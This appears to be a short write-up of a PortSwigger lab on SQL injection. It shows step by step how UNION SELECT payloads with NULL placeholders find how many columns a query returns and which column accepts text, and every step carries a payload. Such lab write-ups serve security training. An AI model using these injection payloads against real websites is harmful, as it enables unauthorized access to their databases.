# SQL Injection - Injecting UNION attack, finding a column containing text

## 📌 Lab Details
- **Title**: SQL Injection - Finding a column containing a specific text
- **Difficulty**: Practitioner
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/dc3ff4b519f1a96f0bd7507a607ced9ca7f87900eb196d0a9b25001de1833f5e?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-find-column-containing-text

## 🔍 Summary
This lab demonstrated how to find a column containing text in a database.

## 🛠 Steps to Solve
1. Determining the number of columns present by injecting `'+UNION+SELECT+NULL,NULL,NULL--`.
2. Injecting `'+UNION+SELECT+'abcdef',NULL,NULL--` to determine which column contains text.
3. Repeat the process and move on to the next null, if an error occurs `'+UNION+SELECT+NULL,'abcdef',NULL--`.
4. Injecting the string given in the lab `'+UNION+SELECT+NULL,'1yqAEG',NULL--` to solve the lab.
   
## 📖 Key Takeaways
- Using `UNION` and  `SELECT` commands to determine the text based column in the database.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/4b1bab26-5c7d-4d22-9dd1-de33424e23a8)
![image](https://github.com/user-attachments/assets/6655f4f5-df23-486b-b51a-99fc506c59a3)
![image](https://github.com/user-attachments/assets/e89ac5fc-7daa-4c7d-8863-ff632e4390f9)
![image](https://github.com/user-attachments/assets/7bcc1c6f-edf6-439a-bf0f-2d1dee1f07a6)
